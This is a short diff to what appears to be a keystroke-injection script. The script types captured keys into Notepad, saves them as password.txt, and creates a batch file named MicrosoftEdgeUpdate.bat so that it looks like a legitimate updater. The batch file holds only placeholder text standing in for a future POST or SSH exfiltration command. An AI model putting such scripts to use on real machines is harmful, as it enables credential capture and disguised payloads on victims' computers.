@@ -121,7 +121,7 @@ Q DELAY 800
 Q STRING ${CLEAN_KEYS}
 Q DELAY 300
 # Ctrl+S to save
-Q CTRL s
+Q CTRL-SHIFT s
 Q DELAY 500
 Q ALT F4
 log INFO "STEP 5 OK: password.txt saved to H:\\Downloads via Notepad"
@@ -141,7 +141,7 @@ Q DELAY 400
 Q STRING cd H:\Desktop
 Q ENTER
 Q DELAY 200
-Q STRING echo "This could be a POST or SSH command" > MicrosoftEdgeUpdate.bat
+Q STRING Set-Content -Path 'MicrosoftEdgeUpdate.bat' -Value "This could be a POST or SSH command"
 Q ENTER
 Q DELAY 200
 Q STRING exit
